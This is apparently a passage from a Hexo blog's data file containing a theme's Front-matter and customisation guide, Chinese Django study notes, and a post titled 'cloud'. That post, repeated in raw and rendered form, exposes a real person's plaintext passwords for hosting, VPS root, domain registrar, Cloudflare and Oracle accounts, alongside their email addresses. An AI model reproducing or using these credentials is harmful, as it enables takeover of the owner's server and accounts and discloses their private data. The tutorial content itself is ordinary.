href=\"#文章-Front-matter-介绍\" class=\"headerlink\" title=\"文章 Front-matter 介绍\"></a>文章 Front-matter 介绍</h2><h3 id=\"Front-matter-选项详解\"><a href=\"#Front-matter-选项详解\" class=\"headerlink\" title=\"Front-matter 选项详解\"></a>Front-matter 选项详解</h3><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p>\n<table>\n<thead>\n<tr>\n<th>配置选项</th>\n<th>默认值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>title</td>\n<td><code>Markdown</code> 的文件标题</td>\n<td>文章标题，强烈建议填写此选项</td>\n</tr>\n<tr>\n<td>date</td>\n<td>文件创建时的日期时间</td>\n<td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td>\n</tr>\n<tr>\n<td>author</td>\n<td>根 <code>_config.yml</code> 中的 <code>author</code></td>\n<td>文章作者</td>\n</tr>\n<tr>\n<td>img</td>\n<td><code>featureImages</code> 中的某个值</td>\n<td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td>\n</tr>\n<tr>\n<td>top</td>\n<td><code>true</code></td>\n<td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td>\n</tr>\n<tr>\n<td>cover</td>\n<td><code>false</code></td>\n<td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td>\n</tr>\n<tr>\n<td>coverImg</td>\n<td>无</td>\n<td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td>\n</tr>\n<tr>\n<td>password</td>\n<td>无</td>\n<td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td>\n</tr>\n<tr>\n<td>toc</td>\n<td><code>true</code></td>\n<td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td>\n</tr>\n<tr>\n<td>mathjax</td>\n<td><code>false</code></td>\n<td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td>\n</tr>\n<tr>\n<td>summary</td>\n<td>无</td>\n<td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td>\n</tr>\n<tr>\n<td>categories</td>\n<td>无</td>\n<td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td>\n</tr>\n<tr>\n<td>tags</td>\n<td>无</td>\n<td>文章标签，一篇文章可以多个标签</td>\n</tr>\n<tr>\n<td>keywords</td>\n<td>文章标题</td>\n<td>文章关键字，SEO 时需要</td>\n</tr>\n<tr>\n<td>reprintPolicy</td>\n<td>cc_by</td>\n<td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p><strong>注意</strong>:</p>\n<ol>\n<li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章的特色图<strong>各有特色</strong>。</li>\n<li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li>\n<li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href=\"http://tool.oschina.net/encrypt?type=2\">开源中国在线工具</a>、<a href=\"http://encode.chahuo.com/\">chahuo</a>、<a href=\"http://tool.chinaz.com/tools/hash.aspx\">站长工具</a>。</li>\n<li>您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</li>\n</ol>\n</blockquote>\n<p>以下为文章的 <code>Front-matter</code> 示例。</p>\n<h3 id=\"最简示例\"><a href=\"#最简示例\" class=\"headerlink\" title=\"最简示例\"></a>最简示例</h3><pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token punctuation\">---</span>\n<span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span> typora<span class=\"token punctuation\">-</span>vue<span class=\"token punctuation\">-</span>theme主题介绍\n<span class=\"token key atrule\">date</span><span class=\"token punctuation\">:</span> <span class=\"token datetime number\">2018-09-07 09:25:00</span>\n<span class=\"token punctuation\">---</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"最全示例\"><a href=\"#最全示例\" class=\"headerlink\" title=\"最全示例\"></a>最全示例</h3><pre class=\"line-numbers language-yaml\" data-language=\"yaml\"><code class=\"language-yaml\"><span class=\"token punctuation\">---</span>\n<span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span> typora<span class=\"token punctuation\">-</span>vue<span class=\"token punctuation\">-</span>theme主题介绍\n<span class=\"token key atrule\">date</span><span class=\"token punctuation\">:</span> <span class=\"token datetime number\">2018-09-07 09:25:00</span>\n<span class=\"token key atrule\">author</span><span class=\"token punctuation\">:</span> 赵奇\n<span class=\"token key atrule\">img</span><span class=\"token punctuation\">:</span> /source/images/xxx.jpg\n<span class=\"token key atrule\">top</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n<span class=\"token key atrule\">cover</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span>\n<span class=\"token key atrule\">coverImg</span><span class=\"token punctuation\">:</span> /images/1.jpg\n<span class=\"token key atrule\">password</span><span class=\"token punctuation\">:</span> 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92\n<span class=\"token key atrule\">toc</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span>\n<span class=\"token key atrule\">mathjax</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span>\n<span class=\"token key atrule\">summary</span><span class=\"token punctuation\">:</span> 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要\n<span class=\"token key atrule\">categories</span><span class=\"token punctuation\">:</span> Markdown\n<span class=\"token key atrule\">tags</span><span class=\"token punctuation\">:</span>\n  <span class=\"token punctuation\">-</span> Typora\n  <span class=\"token punctuation\">-</span> Markdown\n<span class=\"token punctuation\">---</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"效果截图\"><a href=\"#效果截图\" class=\"headerlink\" title=\"效果截图\"></a>效果截图</h2><p><img src=\"http://static.blinkfox.com/matery-20181202-1.png\" alt=\"首页\"></p>\n<p><img src=\"http://static.blinkfox.com/matery-20181202-2.png\" alt=\"首页推荐文章\"></p>\n<p><img src=\"http://static.blinkfox.com/matery-20181202-3.png\" alt=\"首页文章列表\"></p>\n<p><img src=\"http://static.blinkfox.com/matery-20181202-7.png\" alt=\"首页文章列表\"></p>\n<p><img src=\"http://static.blinkfox.com/matery-20181202-8.png\" alt=\"首页文章列表\"></p>\n<h2 id=\"自定制修改\"><a href=\"#自定制修改\" class=\"headerlink\" title=\"自定制修改\"></a>自定制修改</h2><p>在本主题的 <code>_config.yml</code> 中可以修改部分自定义信息，有以下几个部分：</p>\n<ul>\n<li>菜单</li>\n<li>我的梦想</li>\n<li>首页的音乐播放器和视频播放器配置</li>\n<li>是否显示推荐文章名称和按钮配置</li>\n<li><code>favicon</code> 和 <code>Logo</code></li>\n<li>个人信息</li>\n<li>TOC 目录</li>\n<li>文章打赏信息</li>\n<li>复制文章内容时追加版权信息</li>\n<li>MathJax</li>\n<li>文章字数统计、阅读时长</li>\n<li>点击页面的’爱心’效果</li>\n<li>我的项目</li>\n<li>我的技能</li>\n<li>我的相册</li>\n<li><code>Gitalk</code>、<code>Gitment</code>、<code>Valine</code> 和 <code>disqus</code> 评论配置</li>\n<li><a href=\"http://busuanzi.ibruce.info/\">不蒜子统计</a>和谷歌分析（<code>Google Analytics</code>）</li>\n<li>默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 <code>hashcode</code> 值取余，来选择展示对应的特色图</li>\n</ul>\n<p><strong>我认为个人博客应该都有自己的风格和特色</strong>。如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 <code>_config.yml</code> 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：</p>\n<h3 id=\"修改主题颜色\"><a href=\"#修改主题颜色\" class=\"headerlink\" title=\"修改主题颜色\"></a>修改主题颜色</h3><p>在主题文件的 <code>/source/css/matery.css</code> 文件中，搜索 <code>.bg-color</code> 来修改背景颜色：</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */</span>\n<span class=\"token selector\">.bg-color</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">background-image</span><span class=\"token punctuation\">:</span> <span class=\"token function\">linear-gradient</span><span class=\"token punctuation\">(</span>to right<span class=\"token punctuation\">,</span> #4cbf30 0%<span class=\"token punctuation\">,</span> #0f9d58 100%<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token atrule\"><span class=\"token rule\">@-webkit-keyframes</span> rainbow</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token comment\">/* 动态切换背景颜色. */</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token atrule\"><span class=\"token rule\">@keyframes</span> rainbow</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">/* 动态切换背景颜色. */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"修改-banner-图和文章特色图\"><a href=\"#修改-banner-图和文章特色图\" class=\"headerlink\" title=\"修改 banner 图和文章特色图\"></a>修改 banner 图和文章特色图</h3><p>你可以直接在 <code>/source/medias/banner</code> 文件夹中更换你喜欢的 <code>banner</code> 图片，主题代码中是每天动态切换一张，只需 <code>7</code> 张即可。如果你会 <code>JavaScript</code> 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，<code>banner</code> 切换的代码位置在 <code>/layout/_partial/bg-cover-content.ejs</code> 文件的 <code>&lt;script&gt;&lt;/script&gt;</code> 代码中：</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.bg-cover'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">css</span><span class=\"token punctuation\">(</span><span class=\"token string\">'background-image'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'url(/medias/banner/'</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDay</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'.jpg)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>在 <code>/source/medias/featureimages</code> 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 <code>_config.yml</code> 做同步修改。</p>\n"},{"title":"cloud","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-15T13:39:49.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"服务器部署，宝塔面板，cloudflare域名托管，vps和doMainName","_content":"## 购买vps\n> [`racknerd`](https://racknerd.com/)\n\n> username: 749062870@qq.com\n\n> password: 20021218lqs\n\n### vps登录账号密码\n\n> username: root\n\n> password: Ro81pa0uB4L3AT7zvA\n\n## 购买DomainName\n> [`namesilo`](https://www.namesilo.com/)\n\n> username: liqisong\n\n> password: @20021218Lqs\n\n## 管理域名\n> [`cloudflare`](https://dash.cloudflare.com/)\n\n> username: 749062870@qq.com\n\n> password: @20021218Lqs\n\n## oracle账号\n\n> [`https://www.oracle.com/`](https://www.oracle.com/)\n\n> username: liqisong2002@gmail.com\n\n> password: 20021218Lqs@","source":"_posts/cloud.md","raw":"---\ntitle: cloud\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-15 21:39:49\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: 服务器部署，宝塔面板，cloudflare域名托管，vps和doMainName\ntags: cloud\ncategories: 杂项\n---\n## 购买vps\n> [`racknerd`](https://racknerd.com/)\n\n> username: 749062870@qq.com\n\n> password: 20021218lqs\n\n### vps登录账号密码\n\n> username: root\n\n> password: Ro81pa0uB4L3AT7zvA\n\n## 购买DomainName\n> [`namesilo`](https://www.namesilo.com/)\n\n> username: liqisong\n\n> password: @20021218Lqs\n\n## 管理域名\n> [`cloudflare`](https://dash.cloudflare.com/)\n\n> username: 749062870@qq.com\n\n> password: @20021218Lqs\n\n## oracle账号\n\n> [`https://www.oracle.com/`](https://www.oracle.com/)\n\n> username: liqisong2002@gmail.com\n\n> password: 20021218Lqs@","slug":"cloud","published":1,"updated":"2023-05-06T03:57:57.910Z","_id":"clcy8glkx000014vgdo08dv4e","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"购买vps\"><a href=\"#购买vps\" class=\"headerlink\" title=\"购买vps\"></a>购买vps</h2><blockquote>\n<p><a href=\"https://racknerd.com/\"><code>racknerd</code></a></p>\n</blockquote>\n<blockquote>\n<p>username: <a href=\"mailto:&#55;&#x34;&#x39;&#x30;&#54;&#x32;&#x38;&#55;&#x30;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#109;\">&#55;&#x34;&#x39;&#x30;&#54;&#x32;&#x38;&#55;&#x30;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#109;</a></p>\n</blockquote>\n<blockquote>\n<p>password: 20021218lqs</p>\n</blockquote>\n<h3 id=\"vps登录账号密码\"><a href=\"#vps登录账号密码\" class=\"headerlink\" title=\"vps登录账号密码\"></a>vps登录账号密码</h3><blockquote>\n<p>username: root</p>\n</blockquote>\n<blockquote>\n<p>password: Ro81pa0uB4L3AT7zvA</p>\n</blockquote>\n<h2 id=\"购买DomainName\"><a href=\"#购买DomainName\" class=\"headerlink\" title=\"购买DomainName\"></a>购买DomainName</h2><blockquote>\n<p><a href=\"https://www.namesilo.com/\"><code>namesilo</code></a></p>\n</blockquote>\n<blockquote>\n<p>username: liqisong</p>\n</blockquote>\n<blockquote>\n<p>password: @20021218Lqs</p>\n</blockquote>\n<h2 id=\"管理域名\"><a href=\"#管理域名\" class=\"headerlink\" title=\"管理域名\"></a>管理域名</h2><blockquote>\n<p><a href=\"https://dash.cloudflare.com/\"><code>cloudflare</code></a></p>\n</blockquote>\n<blockquote>\n<p>username: <a href=\"mailto:&#55;&#52;&#x39;&#48;&#54;&#50;&#x38;&#x37;&#48;&#64;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;\">&#55;&#52;&#x39;&#48;&#54;&#50;&#x38;&#x37;&#48;&#64;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;</a></p>\n</blockquote>\n<blockquote>\n<p>password: @20021218Lqs</p>\n</blockquote>\n<h2 id=\"oracle账号\"><a href=\"#oracle账号\" class=\"headerlink\" title=\"oracle账号\"></a>oracle账号</h2><blockquote>\n<p><a href=\"https://www.oracle.com/\"><code>https://www.oracle.com/</code></a></p>\n</blockquote>\n<blockquote>\n<p>username: <a href=\"mailto:&#108;&#105;&#x71;&#x69;&#115;&#111;&#110;&#x67;&#50;&#48;&#48;&#x32;&#x40;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#x6d;\">&#108;&#105;&#x71;&#x69;&#115;&#111;&#110;&#x67;&#50;&#48;&#48;&#x32;&#x40;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#x6d;</a></p>\n</blockquote>\n<blockquote>\n<p>password: 20021218Lqs@</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"购买vps\"><a href=\"#购买vps\" class=\"headerlink\" title=\"购买vps\"></a>购买vps</h2><blockquote>\n<p><a href=\"https://racknerd.com/\"><code>racknerd</code></a></p>\n</blockquote>\n<blockquote>\n<p>username: <a href=\"mailto:&#55;&#x34;&#x39;&#x30;&#54;&#x32;&#x38;&#55;&#x30;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#109;\">&#55;&#x34;&#x39;&#x30;&#54;&#x32;&#x38;&#55;&#x30;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#109;</a></p>\n</blockquote>\n<blockquote>\n<p>password: 20021218lqs</p>\n</blockquote>\n<h3 id=\"vps登录账号密码\"><a href=\"#vps登录账号密码\" class=\"headerlink\" title=\"vps登录账号密码\"></a>vps登录账号密码</h3><blockquote>\n<p>username: root</p>\n</blockquote>\n<blockquote>\n<p>password: Ro81pa0uB4L3AT7zvA</p>\n</blockquote>\n<h2 id=\"购买DomainName\"><a href=\"#购买DomainName\" class=\"headerlink\" title=\"购买DomainName\"></a>购买DomainName</h2><blockquote>\n<p><a href=\"https://www.namesilo.com/\"><code>namesilo</code></a></p>\n</blockquote>\n<blockquote>\n<p>username: liqisong</p>\n</blockquote>\n<blockquote>\n<p>password: @20021218Lqs</p>\n</blockquote>\n<h2 id=\"管理域名\"><a href=\"#管理域名\" class=\"headerlink\" title=\"管理域名\"></a>管理域名</h2><blockquote>\n<p><a href=\"https://dash.cloudflare.com/\"><code>cloudflare</code></a></p>\n</blockquote>\n<blockquote>\n<p>username: <a href=\"mailto:&#55;&#52;&#x39;&#48;&#54;&#50;&#x38;&#x37;&#48;&#64;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;\">&#55;&#52;&#x39;&#48;&#54;&#50;&#x38;&#x37;&#48;&#64;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;</a></p>\n</blockquote>\n<blockquote>\n<p>password: @20021218Lqs</p>\n</blockquote>\n<h2 id=\"oracle账号\"><a href=\"#oracle账号\" class=\"headerlink\" title=\"oracle账号\"></a>oracle账号</h2><blockquote>\n<p><a href=\"https://www.oracle.com/\"><code>https://www.oracle.com/</code></a></p>\n</blockquote>\n<blockquote>\n<p>username: <a href=\"mailto:&#108;&#105;&#x71;&#x69;&#115;&#111;&#110;&#x67;&#50;&#48;&#48;&#x32;&#x40;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#x6d;\">&#108;&#105;&#x71;&#x69;&#115;&#111;&#110;&#x67;&#50;&#48;&#48;&#x32;&#x40;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#x6d;</a></p>\n</blockquote>\n<blockquote>\n<p>password: 20021218Lqs@</p>\n</blockquote>\n"},{"title":"Django基础","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-19T07:42:38.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"django学习笔记","_content":"## Django\n### 创建项目\ndjango-admin startproject 项目名\n\n### 创建应用\npython manage.py startapp 应用名\n### 运行web服务器\npython manage.py runserver\n\n\n\n\n```python\npython3 -m http.server [port] # 可以启动一个web服务，供局域网内用户下载文件\n```\n\n### 将固定的路径加入python可以搜索的目录\nimport sys\n\nsys.path.insert(位置（从0开始），要加入搜索的目录)\n```python\npython manage.py shell # 进入django终端\n```\n### ORM框架\n-    1、对象和数据库映射\n-    2、根据设计的模型生成数据库中的表:\n    -  1、生长牵引文件:python manage.py makemigrations\n    - 2、执行牵引文件:python manage.py migrate\n\n### 模型类\n> 在models.py中编写模型类\n\n  -  1、生长迁移文件:python manage.py makemigrations\n    -    注意如果有ForeignKey的话一定要加上on_delete = models.CASCADE\n  - 2、执行迁移文件:python manage.py migrate\n    \n> python manage.py shell\n```text\n首先:导入定义好的模型类\n其次:实例化一个对象\n插入 :对象.属性名=值\n保存:对像.save()\n拿到数据:变量 = 类名.objects.get(条件)\n    变量.属性：直接查看\n    变量.属性=值  ——> 变量.save()  :修改\n    变量.delete():删除\n```\n\n### 后台管理（在admin.py中编写后台管理类）\n```\n本地化: LANGUAGE_CODE = 'zh-hans' :使用中文\n       TIME_ZONE = 'Asia/Shanghai' :使用中国时间\n\n创建管理员:python manage.py createsuperuser   (第一次新建管理员的时候必须要执行一下牵引文件，可以不生成，但必须执行)\n\n自己创建的管理员是默认是放在数据库中的一个单独的表中的，但是可以使用（在settings.py中）：\n# django认证系统使用的模型类\nAUTH_USER_MODEL='应用.类名'\n\n这个来规定生成数据放在什么表，在实际开发中是特别的重要的，一般和用户信息放在一起\n\n使用这个必须导入(models.py中)from django.contrib.auth.models import AbstractUser\n\n加入自己定义的数据库或者数据库模型: 1、导入 2、admin.site.register(类)\n\n规定自定义的数据库或者数据库模型的显示: list_display('','')\n```\n\n### 使用视图（在views中编写）\n```\n使用模块: from django.http import HttpResponse,HttpResponseRedirect(重定向)\n使用模块: from django.shortcuts import render,redirect(也是重定向)\n使用 return HttpResponse('返回值') 返回结果\n使用模块: from django.conf.urls import include, url\nurl的使用方法:url(r'正则表达式',处理字符串)\n            url(r'正则表达式',include(处理源))\n\n实现过程: views.py 中创建视图（使用模块第一个） --->  创建 urls.py (使用第二个模块,并且导入views.py)  --->  项目中的urls.py\n中添加创建的urls.py(使用url添加)\n```\n\n\n### 模板（项目文件夹中创建 模板文件夹templates）\n```\n在项目文件夹中的setting中设置TEMPLATES中的DIRS，表示模板位置，一般拼接\n使用模板:\n    导入模块:from django.template import loader\n    1、使用模板文件: temp = loader.get_template('文件名可以带路径')\n    2、定义上下文（个模板传参数）: context = {字典参数}\n    3、渲染模板:产生HTML代码:res_html = temp.render(context)\n    4、返回浏览器:return HttpResponse(res_html)\n\n最简单的使用方法: return render(request,'文件可以带路径',{传参数})\n\n参数在html代码中的使用方法:\n    普通变量:{{key}}\n    for循环:{% fro x in xx %}\n            {%endfor%}\n\n```\n\n## 关于django和数据库的操作\n```\n1、创models文件 class xxx(models.Model)\n2、迁移文件\n3、创建views文件 def xxx(request)，必须有返回值,一般返回值用HttpResponse,使用模板的返回值用render,需要重定向的话使用redirect\n4、新建应用urls.py文件,用于定义访问时用的url地址\n5、取项目中的urls文件中添加应用的url文件 ：url(r'^',include(xxx.urls))\n6、在项目中创建templates模板文件,在到seting中配置一下，templates中的文件就是html文档\n```\n\n\n### 第一大点:models,模型,注册模型类\ndjango操作数据库的相关知识\n```\n应用下的models.py文件中定义的所有模型，都要继承一个抽象基类:\n创建抽象基类:在项目中创建一个pythonPakage,名字叫db,在这个包下面创建一个base_model.py文件，在文件中编写一个抽像基类\n```\n```python\nfrom django.db import models\nclass BaseModel(models.Model):\n        '''模型抽象基类'''\n        create_time = models.DateTimeField(auto_now_add=True, verbose_name='创建时间')\n    update_time = models.DateTimeField(auto_now=True, verbose_name='更新时间')\n        is_delete = models.BooleanField(default=False, verbose_name='删除标记')\n    class Meta:\n        '''说明是一个抽象模型类'''\n        abstract = True\n```\n\n #####   约束选项在字段类型中使用，字段类型在models模块下使用\n字段类型:\n```\n1、AutoField:自动编号\n2、BooleanField:布尔类型\n3、NullBooleanField:Null，True，False三种值\n4、CharField（max_length=）:字符串,必须指定max_length\n5、TextField:大文本类型\n6、IntegerField:整数\n7、DecimalField(max_digits=,decimal_places=):浮点数，第一个参数表示总位数，第二个参数表示小数位数\n8、FloatField(max_digits=,decimal_places=):浮点数，参数同上\n9、DateField（[auto_now=,auto_now_add=]）:日期类型，有两个可选参数，用的时候只能用一个，第一个表示更新时间，第二个表示第一次创建的的时间\n10、TimeField（[auto_now=,auto_now_add=]）:时分秒\n11、DateTimeField（[auto_now=,auto_now_add=]）:年月日时分秒\n12、FileField:文件上传\n13、ImageField:有效图片\n\n14、ForeignKey:一对多\n15、ManyToManyField:多对多\n16、OneToOneField:一对一\n\n约束选项:\n1、default:默认值\n2、primary_key:主键\n3、unique:不重复\n4、db_index:索引，db_index=True/False\n5、db_column:指定表字段的名字，db_column='名字'\n6、null:空\n7、blank:是否为空，在后台使用，默认True，在django管理页面有用\n8、chioces：chioces选项,等于一个元组，格式 choices = ((xx,xxx),(xx,xxx)……),网页显示为一个列表框\n9、verbose_name：制定在后台的显示名称 ，字段和表名都可以用\n```\n#### 富文本\n```\ndjango使用tinymce：\n    pip install django-tinymce\n    from tinymce.models import HTMLField\n    xx = HTMLField(verbose_name = 'xx')\n    在settings.py中注册这个富文本编辑器，INSTALLED_APPS中添加tinymce\n    在settings.py中设置富文本编辑器的属性：\n        TINYMCE_DEFAULT_CONFIG = {\n            'theme': 'advanced',\n            'width': 编辑器的宽,\n            'height': 编辑器的高,\n        }\n    在项目urls中添加: url(r'^tinymce/', include('tinymce.urls'))\n\n```\n####\t查询\n```\n说明一下:exclude,filter,get三个都时带条件的--->模型名.objects.查询方式(属性名__条件名=值)\n条件名:\nexact:判等 ，可以不用直接用 =\ncontains:模糊查询，包含\nendswith\\startswith:模糊查询，结尾\\开头\nisnull:空查询,布尔值\nin:范围查询，属性名__in = 列表或者元组\ngt,lt,gte,lte:大于，小于，大于等于，小于等于\nday/month/year:使用方法:日期查询\n\nget():返回满足条件的一条记录\nall():返回所有记录，查询集\nfilter():返回满足条件的所有记录，查询集\nexclude():返回不满足条件的所有记录，查询集\norder_by(‘属性名1’,’属性名2'……):升序\norder_by(‘-属性名1’,’-属性名2'……):降序，order_by()是将查出来的数据进行排序，如：BookInfo.objects.all().order_by('id','-btitle')\n\n\nQ对象:用于查询时候的多个条件的  ’与或非‘  表示\n    from django.db.models import Q\n    例子:\n        BookInfo.object.filter(Q(id = 2) & Q(btitle = 'hello'))   与\n        BookInfo.object.filter(Q(id = 2) | Q(btitle = 'hello'))   或\n        BookInfo.object.filter(~Q(id = 2))                        非\nF对象:条件中用于属性比较,还可以进行算数运算\n    from django.db.models import F\n    例子:\n        BookInfo.objects.filter(id__gt = F('bid'))\n        BookInfo.objects.filter(id__gt = F('bid')*3)\n\n\n\n聚合函数:sum,count,avg,max,min,在django中通过aggregates来使用\n    from django.db.models import Sum,Count,Avg,Max,Min\n    例子:\n        BookInfo.objects.all().aggregate(Count('id')) : 返回值是字典\n        BookInfo.objects.all().aggregate(Sum('bread') : 总和\n\n\n插入、更新、删除:\n    save():插入更新\n    delete():删除\n\n关联查询:\n    一对多:对象.多类的名字__set.all()\n    多对一:对象.关系属性\n\n\n模型管理器:\n    也是在models中编写，\n    格式:\n        class xxx (models.Manager):\n            可以定义方法或者定义查询（all）\n\n\n元选项(指定表名):\n    class Meta:\n        db_table = 'xxx'\n    verbose_name = 'xxx'\n    verbose_name_plural = verbose_name\n    每个需要自定义表名的模型下方都要写这个代码，否则用系统给的表明,后两行代码代表指定在后台显示什么名字\n```\n\n\n\n\n## 第二大点:views,视图的使用\n```\n1、项目中的urls中加入应用中的urls中的所有，表示项目启动以后可以使用应用的链接配置\n2、应用中的urls用于配置浏览器页面输入的地址，一般只配置‘/’以后的\n3、编写views文件，写清楚每个url的动作，定义在函数中,需要返回值\n\n4、views文件中所写的代码就是写应该在网页中现实的东西\n5、如果要使用模板，需要在项目文件夹下创建一个templates文件夹，并且配置好路径\n\n6、return HttpResponse(xx),不用模板\n   return HttpResponseRedirect(地址),redirect(地址)，两个功能一样都是重定向，在数据库添加后及时显示时候用\n   return render(request, '模板文件位置',{参数})\n\n重点:关于数据库的操作:导入 models  (类)\n    关于网页内容操作:导入 views   (函数)\n\nseting 中的设置，要改一起改\n    setting 中的DEBUG属性(调试模式):默认是True，改成False后可以显示标准的报错页面\n    setting 中的ALLOWED_HOSTS属性(允许访问):默认注释了的，是一个列表，ALLOWED_HOSTS = ['*']表示所有用户都可访问\n\n给视图传参数: 在urls中配置url的时候，给一个正则的分组就表示给视图传参数:\n            第一种:直接分组:views中的形参可以随便定义 :url(r'^index(\\d+)$',views.show)-->def show(request,a)\n            第二种:分组命名:views长的形参必须和分组的名字一致  :url(r'^index(?p<num>\\d+)$',views.show)-->def show(request,num)\nrequest参数:\n    def index (request)中使用,躲在用于登陆的时候使用\n        request.POST:保存的是网页中用post方式提交的参数，参数保存在请求头中\n        request.GET:保存的是网页中用get方式提交的参数，参数保存在url中\n    使用方法:\n        xx = request.POST.get('xxx')\n        xx = request.GET.get('xxx')\n\n\n 重点:\n    如果是网页模板，那么需要创建一个templates文件夹在项目文件夹下并且setting中配置路径，上面也提到过\n    如果是静态的文件，js，css，image这些文件的话，需要在项目文件夹下创建一个static文件夹，平且在setting中配置STATIC_URL = '/static/' 和 STATICFILES_DIR = [os.path.join(BASE_DIR,'刚刚创建的文件夹static')]\n```\n\n### 